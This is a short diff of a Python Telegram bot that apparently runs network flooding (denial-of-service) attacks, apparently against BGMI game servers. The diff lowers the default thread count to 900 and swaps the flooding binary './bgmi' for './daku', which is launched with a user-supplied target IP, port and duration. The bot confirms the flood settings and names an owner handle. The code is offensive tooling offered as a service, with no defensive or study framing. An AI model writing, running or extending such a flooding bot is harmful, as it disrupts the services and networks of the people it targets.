@@ -18,7 +18,7 @@ flooding_process = None
 flooding_command = None
 
 
-DEFAULT_THREADS = 1000
+DEFAULT_THREADS = 900
 
 
 users = {}
@@ -154,7 +154,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     port = context.args[1]
     duration = context.args[2]
 
-    flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
+    flooding_command = ['./daku', target_ip, port, duration, str(DEFAULT_THREADS)]
     await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWMER- @God_x_Sikandar.')
 
 
